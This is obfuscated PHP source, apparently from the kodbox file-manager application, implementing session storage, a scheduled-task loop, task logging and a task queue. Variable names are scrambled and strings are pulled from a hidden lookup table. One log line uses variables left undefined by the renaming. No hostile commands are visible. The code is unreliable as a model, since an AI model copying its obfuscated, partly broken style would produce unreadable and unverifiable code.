$ğİÃ¯äÍ[$ô½óø¨§[1923]]; $ÅÀ…£éÂ = $ğİÃ¯äÍ[$ÁŞˆåÈŞ]; $­ë²à’ = $ğİÃ¯äÍ[$ô½óø¨§[989]]; switch ($ÁŞˆåÈŞ) { case $ô½óø¨§[21]: self::$handle = Model($ô½óø¨§[990]); break; case $ô½óø¨§[991]: self::$handle = new CacheRedis($ÅÀ…£éÂ, $­ë²à’); break; case $ô½óø¨§[992]: self::$handle = new CacheMemcached($ÅÀ…£éÂ, $­ë²à’); break; case $ô½óø¨§[230]: $ÅÀ…£éÂ[$ô½óø¨§[87]] = $ÅÀ…£éÂ[$ô½óø¨§[87]] . $ô½óø¨§[1924]; self::$handle = new CacheFile($ÅÀ…£éÂ, $­ë²à’); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$ô½óø¨§[1659]]) || time() - self::$data[$ô½óø¨§[1659]] >= 5) { self::dataSave(); } } $¹Äñàï– = new self(); return $¹Äñàï–; } public static function getBySign($¤‚’§Ò) { $Õ˜ßŸô = self::$handle->get($¤‚’§Ò); $Õ˜ßŸô = unserialize($Õ˜ßŸô); return is_array($Õ˜ßŸô) ? $Õ˜ßŸô : array(); } public static function setBySign($Œ®ûÈ£, $‹Ì¶ø¶Ô) { self::$sessionSign = $Œ®ûÈ£; self::$data = $‹Ì¶ø¶Ô; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[œ—üé‹ê][1659]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($İ‘×Úñ = false) { if ($İ‘×Úñ) { self::$sessionSign = $İ‘×Úñ; } self::init(); return self::$sessionSign; } public static function set($µá¹¬‚Ş, $ú€ı¡½¨ = false) { self::init(); if (is_array($µá¹¬‚Ş)) { foreach ($µá¹¬‚Ş as $ŞŒ©ş¦‚ => $Îƒ¥ÔòÌ) { array_set_value(self::$data, $ŞŒ©ş¦‚, $Îƒ¥ÔòÌ); } } else { array_set_value(self::$data, $µá¹¬‚Ş, $ú€ı¡½¨); } self::dataSave(); } public static function get($Íæ×èà€ = false) { self::init(); if (!$Íæ×èà€) { return self::$data; } return array_get_value(self::$data, $Íæ×èà€); } public static function remove($š×åïá) { self::init(); unset(self::$data[$š×åïá]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[œ—üé‹ê][998])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $å»¸×ÍŒ =& $_SERVER[œ—üé‹ê]; if (self::valueGet($å»¸×ÍŒ[859]) != $å»¸×ÍŒ[91]) { return; } if (self::valueGet($å»¸×ÍŒ[948]) == $å»¸×ÍŒ[91]) { $Ù­–øÂ– = self::valueGet($å»¸×ÍŒ[1925]); if (time() - $Ù­–øÂ– > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($å»¸×ÍŒ[948], $å»¸×ÍŒ[91]); self::log($å»¸×ÍŒ[1926] . ACTION . $å»¸×ÍŒ[1927]); Hook::bind($å»¸×ÍŒ[1928], $å»¸×ÍŒ[1929]); $‘å¸û‰ç = 0; while (!0) { self::cacheClear(); if (self::valueGet($å»¸×ÍŒ[859]) != $å»¸×ÍŒ[91]) { self::valueSet($å»¸×ÍŒ[948], $å»¸×ÍŒ[228]); self::log($å»¸×ÍŒ[1930]); die; } $¿“Ôãµ = time(); if ($¿“Ôãµ - $‘å¸û‰ç >= 60) { self::valueSet(array($å»¸×ÍŒ[948] => $å»¸×ÍŒ[91], $å»¸×ÍŒ[1925] => $¿“Ôãµ)); $‘å¸û‰ç = $¿“Ôãµ; } if (!file_exists(USER_SYSTEM . $å»¸×ÍŒ[1931])) { self::valueSet(array($å»¸×ÍŒ[948] => $å»¸×ÍŒ[228], $å»¸×ÍŒ[859] => $å»¸×ÍŒ[228])); self::log($å»¸×ÍŒ[1932]); die; } $Ş¢š¹Íœ = file_get_contents(BASIC_PATH . $å»¸×ÍŒ[1933]); $¶“£«œ® = KOD_VERSION . $å»¸×ÍŒ[10] . KOD_VERSION_BUILD; $ÇÓ­ì÷© = match_text($Ş¢š¹Íœ, $å»¸×ÍŒ[1934]) . $å»¸×ÍŒ[10] . match_text($Ş¢š¹Íœ, $å»¸×ÍŒ[1935]); if ($ÇÓ­ì÷© != $¶“£«œ®) { self::restart(); self::log("\x73\x74\157\x70\145\x64\56\x5b\x76\145\x72\x73\x69\x6f\x6e\40\x75\x70\x64\141\164\145\73{$versionNow}\40\x3d\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÌÕ˜ÇÙ· =& $_SERVER[œ—üé‹ê]; http_close(); $GLOBALS[$ÌÕ˜ÇÙ·[1936]] = 1; $_SERVER[$ÌÕ˜ÇÙ·[1937]] = $ÌÕ˜ÇÙ·[1938]; $_COOKIE = array(); $GLOBALS[$ÌÕ˜ÇÙ·[1939]] = 1; $GLOBALS[$ÌÕ˜ÇÙ·[1940]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $®Æ¸Œë =& $_SERVER[œ—üé‹ê]; http_close(); self::valueSet($®Æ¸Œë[859], $®Æ¸Œë[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($®Æ¸Œë[948] => $®Æ¸Œë[228], $®Æ¸Œë[859] => $®Æ¸Œë[91])); self::log($®Æ¸Œë[1941]); } public static function taskSwitch() { $‡°ìç“ =& $_SERVER[œ—üé‹ê]; $ë¥ü¸Ú– = self::valueGet($‡°ìç“[859]) == $‡°ìç“[91] ? $‡°ìç“[228] : $‡°ìç“[91]; self::valueSet($‡°ìç“[859], $ë¥ü¸Ú–); } public static function shutdownEvent() { $ïíöœÕ =& $_SERVER[œ—üé‹ê]; self::valueSet($ïíöœÕ[948], $ïíöœÕ[228]); self::log($ïíöœÕ[1942]); } public static function config($Æ¼’±è, $›ß˜Áç) { self::valueSet($_SERVER[œ—üé‹ê][859], $Æ¼’±è); } private static function taskRunAll() { $‡€µ® =& $_SERVER[œ—üé‹ê]; $ó±½¨¯ø = timeFloat(); $øéù¢öÓ = Model($‡€µ®[1943])->listData(); $ºêÈ²Éº = count($øéù¢öÓ); for ($åŒˆßÄº = 0; $åŒˆßÄº < $ºêÈ²Éº; $åŒˆßÄº++) { $Œ€…ÁÎ = $øéù¢öÓ[$åŒˆßÄº]; if (!$Œ€…ÁÎ[$‡€µ®[487]] || $Œ€…ÁÎ[$‡€µ®[1944]] != $‡€µ®[91]) { continue; } if (!self::taskTimeCheck($Œ€…ÁÎ)) { continue; } self::taskRun($Œ€…ÁÎ); } Hook::trigger($‡€µ®[1945]); self::taskQueueRun($ó±½¨¯ø); } private static function taskQueueRun($ò×å€£¿) { $Éê¯Éšê = 10; while (!0) { $µå‹Çõ“ = TaskQueue::run(); if ($µå‹Çõ“ === !1) { break; } if (timeFloat() - $ò×å€£¿ >= $Éê¯Éšê) { break; } } } private static function taskTimeCheck($œäÃÎÖ) { $œŠ×äÎ˜ =& $_SERVER[œ—üé‹ê]; $§”„³È = json_decode($œäÃÎÖ[$œŠ×äÎ˜[204]], !0); $á°üüÁ× = intval($œäÃÎÖ[$œŠ×äÎ˜[1925]]); $ìÌÔ½óß = strtotime($œŠ×äÎ˜[1946] . $§”„³È[$œŠ×äÎ˜[1947]] . $œŠ×äÎ˜[1948]) - strtotime($œŠ×äÎ˜[1949]); $­÷¢Ú˜Ğ = time() - strtotime(date($œŠ×äÎ˜[1950]) . $œŠ×äÎ˜[1951]); $ıà®Àûî = $­÷¢Ú˜Ğ >= $ìÌÔ½óß && $­÷¢Ú˜Ğ <= $ìÌÔ½óß + 3600; switch ($§”„³È[$œŠ×äÎ˜[33]]) { case $œŠ×äÎ˜[1952]: if (time() - $á°üüÁ× < 3600 * 24 * 30) { return !1; } if ($§”„³È[$œŠ×äÎ˜[1952]] == date($œŠ×äÎ˜[1953]) && $ıà®Àûî) { return !0; } break; case $œŠ×äÎ˜[1954]: if (time() - $á°üüÁ× < 3600 * 24 * 7) { return !1; } $õÎíåìâ = date($œŠ×äÎ˜[1955]) == 0 ? 7 : date($œŠ×äÎ˜[1955]); if ($§”„³È[$œŠ×äÎ˜[1954]] == $õÎíåìâ && $ıà®Àûî) { return !0; } break; case $œŠ×äÎ˜[1947]: if (time() - $á°üüÁ× < 3600 * 24) { return !1; } if ($ıà®Àûî) { return !0; } break; case $œŠ×äÎ˜[1956]: if (time() - $á°üüÁ× >= floatval($§”„³È[$œŠ×äÎ˜[1956]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Şã­¤Ş³ =& $_SERVER[œ—üé‹ê]; static $ùç‘¦õ = 0; $ä Ÿ“Ü· = 300; if (!$ùç‘¦õ) { $ùç‘¦õ = time(); } if (time() - $ùç‘¦õ < $ä Ÿ“Ü·) { return; } $ùç‘¦õ = time(); $à¼¸„ø° = Model($Şã­¤Ş³[597])->db($Şã­¤Ş³[12]); if ($à¼¸„ø°) { $à¼¸„ø°->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Şã­¤Ş³[1957], $Şã­¤Ş³[1958]); die; } } public static function taskRun($˜¥ïú´œ) { $Áøë ‘Ï =& $_SERVER[œ—üé‹ê]; self::log($Áøë ‘Ï[1959] . $˜¥ïú´œ[$Áøë ‘Ï[487]] . $Áøë ‘Ï[1960] . $˜¥ïú´œ[$Áøë ‘Ï[32]] . $Áøë ‘Ï[1961] . $˜¥ïú´œ[$Áøë ‘Ï[1560]]); Model($Áøë ‘Ï[1943])->run($˜¥ïú´œ[$Áøë ‘Ï[487]]); $à‘Ô÷’Õ = timeFloat(); $ç˜‘±êÒ = $Áøë ‘Ï[12]; switch ($˜¥ïú´œ[$Áøë ‘Ï[33]]) { case $Áøë ‘Ï[382]: $şñ›—†ª = url_request($˜¥ïú´œ[$Áøë ‘Ï[1560]], $Áøë ‘Ï[1602], !1, !1, !1, !1, 10); if ($şñ›—†ª[$Áøë ‘Ï[859]]) { $ç˜‘±êÒ = strlen($şñ›—†ª[$Áøë ‘Ï[1388]]); } break; case $Áøë ‘Ï[1962]: $ç˜‘±êÒ = Hook::apply($˜¥ïú´œ[$Áøë ‘Ï[1560]]); default: break; } Model($Áøë ‘Ï[1963])->add(array($Áøë ‘Ï[1964] => $Áøë ‘Ï[12], $Áøë ‘Ï[1965] => $Áøë ‘Ï[228], $Áøë ‘Ï[33] => $Áøë ‘Ï[1966] . $˜¥ïú´œ[$Áøë ‘Ï[487]], $Áøë ‘Ï[1967] => json_encode(array($Áøë ‘Ï[32] => $˜¥ïú´œ[$Áøë ‘Ï[32]], $Áøë ‘Ï[1968] => timeFloat() - $à‘Ô÷’Õ, $Áøë ‘Ï[865] => $ç˜‘±êÒ)))); $£Íç®Âê = $ç˜‘±êÒ ? $Áøë ‘Ï[1969] . $ç˜‘±êÒ : $Áøë ‘Ï[12]; self::log($Áøë ‘Ï[1970] . $˜¥ïú´œ[$Áøë ‘Ï[487]] . $Áøë ‘Ï[175] . $£Íç®Âê); return !0; } public static function valueGet($ï°ß¿àæ) { $ğğ¡¾¹Ğ =& $_SERVER[œ—üé‹ê]; $ØÖ“€¢¨ = $ğğ¡¾¹Ğ[1971]; $Áëµé¨ = Model($ğğ¡¾¹Ğ[522])->get($ï°ß¿àæ, $ØÖ“€¢¨); if (is_null($Áëµé¨)) { Model($ğğ¡¾¹Ğ[522])->set($ğğ¡¾¹Ğ[859], $ğğ¡¾¹Ğ[91], $ØÖ“€¢¨); Model($ğğ¡¾¹Ğ[522])->set($ğğ¡¾¹Ğ[948], $ğğ¡¾¹Ğ[228], $ØÖ“€¢¨); $Áëµé¨ = Model($ğğ¡¾¹Ğ[522])->get($ï°ß¿àæ, $ØÖ“€¢¨); } return $Áëµé¨; } private static function valueSet($„¬¬à, $Ç²Û·×’ = false) { $¿·¿šêâ =& $_SERVER[œ—üé‹ê]; $ôÓŒ†øÕ = $¿·¿šêâ[1972]; CacheLock::lock($ôÓŒ†øÕ); $ºêêÕ¨ = Model($¿·¿šêâ[522])->set($„¬¬à, $Ç²Û·×’, $¿·¿šêâ[1971]); CacheLock::unlock($ôÓŒ†øÕ); return $ºêêÕ¨; } protected static function log($Ó¢ãšØ) { write_log($Ó¢ãšØ, $_SERVER[œ—üé‹ê][1958]); } private static function cacheClear() { $ˆ…˜¿‰› =& $_SERVER[œ—üé‹ê]; Cache::clearMemory(Model($ˆ…˜¿‰›[522])->cacheKey($ˆ…˜¿‰›[1971])); Cache::clearMemory(Model($ˆ…˜¿‰›[522])->cacheKey($ˆ…˜¿‰›[1973])); Model($ˆ…˜¿‰›[1943])->cacheClear(); self::closeDatabase(); } } goto b£‘¥¦ƒ·¥; aÜ¼³ ¹¦: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($üŠùõì¡, $ú¨Öşê‡ = '', $¡ÌÄÑ’Ú = 0, $“û“ßÃ  = '') { $™§ƒ¸Ã§ =& $_SERVER[œ—üé‹ê]; $“û“ßÃ  = $“û“ßÃ  ? $“û“ßÃ  : ($ú¨Öşê‡ ? $ú¨Öşê‡ : $üŠùõì¡); $œÄı­‹¯ = new Task($üŠùõì¡, $ú¨Öşê‡, $¡ÌÄÑ’Ú, $“û“ßÃ ); $GLOBALS[$™§ƒ¸Ã§[2065] . $üŠùõì¡] = new TaskLog($™§ƒ¸Ã§[1958], $œÄı­‹¯, $“û“ßÃ ); return $œÄı­‹¯; } public function __construct($Êˆä—®ğ = '', $Ë‘‘áÅ = '', $Š„€î¥Ê = '') { $¬®Şªß± =& $_SERVER[œ—üé‹ê]; if (!$Êˆä—®ğ) { $Êˆä—®ğ = $¬®Şªß±[1958]; } $®¨¯âÈè = $Êˆä—®ğ . $¬®Şªß±[476] . rand_string(10); if (!$Š„€î¥Ê) { $Š„€î¥Ê = $Êˆä—®ğ . $¬®Şªß±[53] . $Š„€î¥Ê; } switch ($Êˆä—®ğ) { case $¬®Şªß±[1958]: if (!$Ë‘‘áÅ || !$Ë‘‘áÅ->task) { return echoLog($Êˆä—®ğ . $¬®Şªß±[2066]); } $ÚÎâÄñÖ = $Ë‘‘áÅ; $®¨¯âÈè = $ÚÎâÄñÖ->task[$¬®Şªß±[487]]; $Êˆä—®ğ = $ÚÎâÄñÖ->task[$¬®Şªß±[487]]; if (!$ÚÎâÄñÖ->task[$¬®Şªß±[1861]]) { $ÚÎâÄñÖ->task[$¬®Şªß±[1861]] = $Š„€î¥Ê ? $Š„€î¥Ê : $Êˆä—®ğ; } break; case $¬®Şªß±[2067]: if (!$Ë‘‘áÅ) { return echoLog($Êˆä—®ğ . $¬®Şªß±[2068]); } $“€ØšÕ = is_string($Ë‘‘áÅ) ? array($Ë‘‘áÅ) : $Ë‘‘áÅ; $ÚÎâÄñÖ = new TaskFileTransfer($®¨¯âÈè, $Êˆä—®ğ, 0, $Š„€î¥Ê ? $Š„€î¥Ê : $“€ØšÕ[0]); foreach ($“€ØšÕ as $† ‹çĞõ) { $ÚÎâÄñÖ->addPath($† ‹çĞõ); } break; case $¬®Şªß±[388]: if (!$Ë‘‘áÅ) { return echoLog($Êˆä—®ğ . $¬®Şªß±[2068]); } $“€ØšÕ = is_string($Ë‘‘áÅ) ? array($Ë‘‘áÅ) : $Ë‘‘áÅ; $ÚÎâÄñÖ = new TaskZip($®¨¯âÈè, $Êˆä—®ğ, 0, $Š„€î¥Ê ? $Š„€î¥Ê : $“€ØšÕ[0]); foreach ($“€ØšÕ as $† ‹çĞõ) { $ÚÎâÄñÖ->addPath($† ‹çĞõ); } break; case $¬®Şªß±[1400]: if (!$Ë‘‘áÅ) { return echoLog($Êˆä—®ğ . $¬®Şªß±[2068]); } $ÚÎâÄñÖ = new TaskUnZip($®¨¯âÈè, $Êˆä—®ğ, 0, $Š„€î¥Ê ? $Š„€î¥Ê : $Ë‘‘áÅ); if ($Ë‘‘áÅ) { $ÚÎâÄñÖ->addFile($Ë‘‘áÅ); } break; case $¬®Şªß±[149]: $ÚÎâÄñÖ = new TaskHttp($®¨¯âÈè, $Êˆä—®ğ); break; default: return; break; } $this->task = $ÚÎâÄñÖ; $this->taskID = $®¨¯âÈè; Hook::bind($¬®Şªß±[1994], array($this, $¬®Şªß±[2069])); Hook::bind($¬®Şªß±[1996], array($this, $¬®Şªß±[2070])); Hook::bind($¬®Şªß±[1990], array($this, $¬®Şªß±[2071])); echoLog($¬®Şªß±[2072] . $ÚÎâÄñÖ->task[$¬®Şªß±[1861]]); } public function __destruct() { $this->end(); } public function end($Œåèû€« = '') { $ƒÛïìØ =& $_SERVER[œ—üé‹ê]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Œåèû€«); $this->task = !1; $this->taskID = !1; Hook::unbind($ƒÛïìØ[1994], array($this, $ƒÛïìØ[2069])); Hook::unbind($ƒÛïìØ[1996], array($this, $ƒÛïìØ[2070])); Hook::unbind($ƒÛïìØ[1990], array($this, $ƒÛïìØ[2071])); } public function taskUpdate($Ì²Íñû) { $Àƒó½°§ =& $_SERVER[œ—üé‹ê]; if (!$Ì²Íñû || $this->taskID != $Ì²Íñû[$Àƒó½°§[487]]) { return; } $¤Í´Æ®ı = 20; $×ª™ß´ê = intval($Ì²Íñû[$Àƒó½°§[1975]] * $¤Í´Æ®ı); $ü±¹ÛÑë = $Àƒó½°§[173] . str_repeat($Àƒó½°§[464], $×ª™ß´ê) . $Àƒó½°§[1181] . str_repeat($Àƒó½°§[53], $¤Í´Æ®ı - $×ª™ß´ê) . $Àƒó½°§[175]; $Ş²ö²– = $ü±¹ÛÑë . sprintf($Àƒó½°§[2073], $Ì²Íñû[$Àƒó½°§[1975]] * 100) . $Àƒó½°§[2074]; $İú­‘ô = $Ş²ö²– . $Ì²Íñû[$Àƒó½°§[1974]] . $Àƒó½°§[8] . $Ì²Íñû[$Àƒó½°§[961]] . LNG($Àƒó½°§[2075]); $ˆ“ôè«± = $Àƒó½°§[12]; if ($Ì²Íñû[$Àƒó½°§[2059]]) { $İú­‘ô = $Ş²ö²– . size_format($Ì²Íñû[$Àƒó½°§[1974]]) . $Àƒó½°§[8] . size_format($Ì²Íñû[$Àƒó½°§[961]]); $ˆ“ôè«± = size_format($Ì²Íñû[$Àƒó½°§[1976]]) . $Àƒó½°§[2076]; } if ($Ì²Íñû[$Àƒó½°§[1230]]) { $Ì²Íñû[$Àƒó½°§[2025]] = $Ì²Íñû[$Àƒó½°§[1230]] . $Àƒó½°§[53] . $Ì²Íñû[$Àƒó½°§[2025]]; } if ($Ì²Íñû[$Àƒó½°§[2025]]) { $ÄæÃü™¯ = $Àƒó½°§[12]; if ($Ì²Íñû[$Àƒó½°§[2027]]) { $ÄæÃü™¯ = $Àƒó½°§[50] . size_format($Ì²Íñû[$Àƒó½°§[2028]]) . $Àƒó½°§[8] . size_format($Ì²Íñû[$Àƒó½°§[2027]]); } $ˆ“ôè«± .= $Ì²Íñû[$Àƒó½°§[2025]] . $ÄæÃü™¯; } if ($Ì²Íñû[$Àƒó½°§[873]] && !$Ì²Íñû[$Àƒó½°§[2027]]) { $ˆ“ôè«± .= $Àƒó½°§[53] . size_format($Ì²Íñû[$Àƒó½°§[950]]) . $Àƒó½°§[8] . size_format($Ì²Íñû[$Àƒó½°§[873]]); } echoLog($İú­‘ô . $Àƒó½°§[53] . $ˆ“ôè«±, !0); } public function taskEnd($íŠú”¨“) { $ñíÚ¼ºø =& $_SERVER[œ—üé‹ê]; if (!$íŠú”¨“ || $this->taskID != $íŠú”¨“[$ñíÚ¼ºø[487]]) { return; } $ñÒ”ÏÂß = $íŠú”¨“ ? LNG($ñíÚ¼ºø[2077]) . $ñíÚ¼ºø[4] . $íŠú”¨“[$ñíÚ¼ºø[1974]] . $ñíÚ¼ºø[8] . $íŠú”¨“[$ñíÚ¼ºø[961]] . LNG($ñíÚ¼ºø[2075]) . $ñíÚ¼ºø[74] : $ñíÚ¼ºø[12]; echoLog($ñíÚ¼ºø[2078] . $íŠú”¨“[$ñíÚ¼ºø[1861]] . ($íŠú”¨“[$ñíÚ¼ºø[540]] ? $ñíÚ¼ºø[74] . $íŠú”¨“[$ñíÚ¼ºø[540]] : $ñíÚ¼ºø[12]) . $ñíÚ¼ºø[74] . $ñÒ”ÏÂß . $ñíÚ¼ºø[2079] . sprintf($ñíÚ¼ºø[1016], timeFloat() - $íŠú”¨“[$ñíÚ¼ºø[1977]]) . $ñíÚ¼ºø[1989]); $this->end(); } public function taskKill($ö¯·¾¸¡) { $àØİ¼Íş =& $_SERVER[œ—üé‹ê]; if (!$ö¯·¾¸¡ || $this->taskID != $ö¯·¾¸¡[$àØİ¼Íş[487]]) { return; } echoLog($àØİ¼Íş[2080] . $ö¯·¾¸¡[$àØİ¼Íş[1861]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\x75\145\x75\145\114\x65\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\165\x65\x75\145\104\x61\164\x61"; const QUEUE_TIME = "\x74\141\163\153\x51\165\145\x75\x65\x4c\x61\163\x74\122\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\153\x51\165\x65\165\145\124\x68\162\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($½˜¡Ú¬, $¥öâÕ¼ = array(), $–Ê°ßêæ = '', $‘ªÊéìÒ = '') { $‘„ÛÉÑË =& $_SERVER[œ—üé‹ê]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‘ªÊéìÒ && array_find_by_field(self::$listData, $‘„ÛÉÑË[95], $‘ªÊéìÒ)) { return !0; } if ($‘ªÊéìÒ && array_find_by_field(self::$listDataAdd, $‘„ÛÉÑË[95], $‘ªÊéìÒ)) { return !0; } self::$listDataAdd[] = array($‘„ÛÉÑË[342] => $½˜¡Ú¬, $‘„ÛÉÑË[2081] => $¥öâÕ¼, $‘„ÛÉÑË[540] => $–Ê°ßêæ, $‘„ÛÉÑË[95] => $‘ªÊéìÒ); return !0; } public static function addSubmit() { $¡ –Ø€½ =& $_SERVER[œ—üé‹ê]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¡ –Ø€½[2082] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¡ –Ø€½[12], $¡ –Ø€½[540])), $¡ –Ø€½[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ğçî­“, $¶ÕÊ„‹â = array(), $ÆÁÙ®ˆ× = '', $±®´°Áé = '') { $Ñ´äôÀ³ =& $_SERVER[œ—üé‹ê]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ûªñ = self::getAll(); if ($±®´°Áé && array_find_by_field($Ûªñ, $Ñ´äôÀ³[95], $±®´°Áé)) { return !0; } $Ûªñ[] = array($Ñ´äôÀ³[342] => $ğçî­“, $Ñ´äôÀ³[2081] => $¶ÕÊ„‹â, $Ñ´äôÀ³[540] => $ÆÁÙ®ˆ×, $Ñ´äôÀ³[95] => $±®´°Áé); self::setAll($Ûªñ); write_log($Ñ´äôÀ³[2082] . $ÆÁÙ®ˆ×, $Ñ´äôÀ³[195]); return !0; } public static function run() { $ô»¸ÇÑ½ =& $_SERVER[œ—üé‹ê]; $¸­ã½Ë˜ = self::getAll(); $÷ıåáƒŒ = array_shift($¸­ã½Ë˜); if (!$÷ıåáƒŒ) { return !1; } self::setAll($¸­ã½Ë˜); $©¹˜©¦£ = timeFloat(); $¼ù›ñ±ù = $ô»¸ÇÑ½[12]; try { $¼ù›ñ±ù = Hook::apply($÷ıåáƒŒ[$ô»¸ÇÑ½[342]], $÷ıåáƒŒ[$ô»¸ÇÑ½[2081]]); } catch (Exception $ÀÍ¿¥ø) { write_log($ÀÍ¿¥ø, $ô»¸ÇÑ½[1367]); } $­œâ” = number_format(timeFloat() - $©¹˜©¦£, 3) . $ô»¸ÇÑ½[1989]; if ($¼ù›ñ±ù && is_string($¼ù›ñ±ù)) { $­œâ” = $­œâ” . $ô»¸ÇÑ½[2083] . $¼ù›ñ±ù; } write_log($ô»¸ÇÑ½[2084] . $÷ıåáƒŒ[$ô»¸ÇÑ½[540]] . $ô»¸ÇÑ½[2085] . $­œâ”, $ô»¸ÇÑ½[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ûƒšª”˜ =& $_SERVER[œ—üé‹ê]; $ ÀõÖğ = self::threadCount() + 1; if ($ ÀõÖğ > 3 || !self::count()) { return; } write_log($ûƒšª”˜[2086] . $ ÀõÖğ, $ûƒšª”˜[195]); Cache::set(self::QUEUE_THREAD, $ ÀõÖğ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ûƒšª”˜[2087], $ûƒšª”˜[195]); } public static function getKey($üØ¢Û, $Äû¬Û™È = "\151\156\164") { $İ–©»ò¢ =& $_SERVER[œ—üé‹ê]; Cache::removeMemory($üØ¢Û); $ËÂÚ§äã = Cache::get($üØ¢Û); if ($Äû¬Û™È == $İ–©»ò¢[364]) { return $ËÂÚ§äã ? intval($ËÂÚ§äã) : 0; } if ($Äû¬Û™È == $İ–©»ò¢[2088]) { return is_array($ËÂÚ§äã) ? $ËÂÚ§äã : array(); } return $ËÂÚ§äã; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[œ—üé‹ê][2088]); } public static function setAll($ÍÙØÂãÌ) { $¸µ­«†ï = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÍÙØÂãÌ), $¸µ­«†ï); Cache::set(self::QUEUE_DATA, $ÍÙØÂãÌ, $¸µ­«†ï); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($·³Ö®Æ’, $ğÌ…·ªŸ = 5.0) { if (!$·³Ö®Æ’) { return; } $Ë™º¸Íœ = Cache::get($·³Ö®Æ’); if (!$Ë™º¸Íœ || timeFloat() - floatVal($Ë™º¸Íœ) >= $ğÌ…·ªŸ) { Cache::set($·³Ö®Æ’, timeFloat(), $ğÌ…·ªŸ * 10); return !0; } return !1; } public static function timeLimitCall($ëÈ§ ¬Ÿ, $Òåºâ´È, $¤ÍŠ°è¶, $œ²·õ‰ß = 5.0) { $³¥Æ…´â =& $_SERVER[œ—üé‹ê]; if (!$ëÈ§ ¬Ÿ || !$Òåºâ´È) { return; } self::$asyncAdd = !0; $•ßê©¨Ã = $³¥Æ…´â[2089]; $Û†Û¼Ò‡ = Cache::get($•ßê©¨Ã, !0); $øæ¶Ñ = array($³¥Æ…´â[2090] => timeFloat(), $³¥Æ…´â[2091] => timeFloat(), $³¥Æ…´â[342] => $Òåºâ´È, $³¥Æ…´â[2081] => $¤ÍŠ°è¶, $³¥Æ…´â[2092] => $œ²·õ‰ß); if (is_array($Û†Û¼Ò‡[$ëÈ§ ¬Ÿ])) { if (timeFloat() - $Û†Û¼Ò‡[$ëÈ§ ¬Ÿ][$³¥Æ…´â[2090]] <= $øæ¶Ñ[$³¥Æ…´â[2092]] * 0.5) { return; } $øæ¶Ñ[$³¥Æ…´â[2091]] = $Û†Û¼Ò‡[$ëÈ§ ¬Ÿ][$³¥Æ…´â[2091]]; } $Û†Û¼Ò‡[$ëÈ§ ¬Ÿ] = $øæ¶Ñ; Cache::set($•ßê©¨Ã, $Û†Û¼Ò‡, 60); Cache::removeMemory($•ßê©¨Ã); write_log($³¥Æ…´â[2093] . $ëÈ§ ¬Ÿ . $³¥Æ…´â[74] . $Òåºâ´È . $³¥Æ…´â[2094] . ACTION, $³¥Æ…´â[195]); } public static function timeLimitCallLoop() { $”ÕÖÕ˜ã =& $_SERVER[œ—üé‹ê]; $Æ¢‰Û´‰ = array($”ÕÖÕ˜ã[2095]); $ÇìÕ¨„ß = in_array(strtolower(ACTION), $Æ¢‰Û´‰); if (!$ÇìÕ¨„ß && !self::$asyncAdd) { return; } $¾ò’Ü£ = $”ÕÖÕ˜ã[2089]; $Ô–¶Ñğ¤ = Cache::get($¾ò’Ü£, !0); if (!$Ô–¶Ñğ¤ || count($Ô–¶Ñğ¤) <= 0) { return; } $ÓÀ•›íÎ = timeFloat(); $ñ×ê¢©ˆ = array(); $ÑÆÖëéÅ = array(); foreach ($Ô–¶Ñğ¤ as $áŸÇğ’ => $àµôşâ€) { if ($ÓÀ•›íÎ - $àµôşâ€[$”ÕÖÕ˜ã[2091]] > $àµôşâ€[$”ÕÖÕ˜ã[2092]]) { $ÑÆÖëéÅ[$áŸÇğ’] = $àµôşâ€; continue; } $ñ×ê¢©ˆ[$áŸÇğ’] = $àµôşâ€; } if (count($ÑÆÖëéÅ) == 0) { return; } if (count($ñ×ê¢©ˆ) == 0) { Cache::remove($¾ò’Ü£); } else { 